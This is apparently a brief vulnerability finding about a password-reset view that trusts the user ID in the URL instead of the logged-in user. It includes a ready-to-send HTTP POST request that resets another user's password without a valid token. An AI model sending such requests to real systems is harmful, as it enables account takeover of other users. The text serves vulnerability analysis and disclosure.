diagnosis: The view provides a shortcut where authenticated users do not have their reset tokens validated. However, it updates target_user derived from kwargs['uidb64'] rather than request.user. Any authenticated user can supply any victim user's base64 ID in the URL and reset their password without knowing their reset token.
exploit_request:
POST /accounts/unified-reset/Mg/any-token-string/ HTTP/1.1
Host: platform.saasapp.com
Cookie: sessionid=authenticated_attacker_session
Content-Type: application/x-www-form-urlencoded

new_password=TakeoverPassword2026!
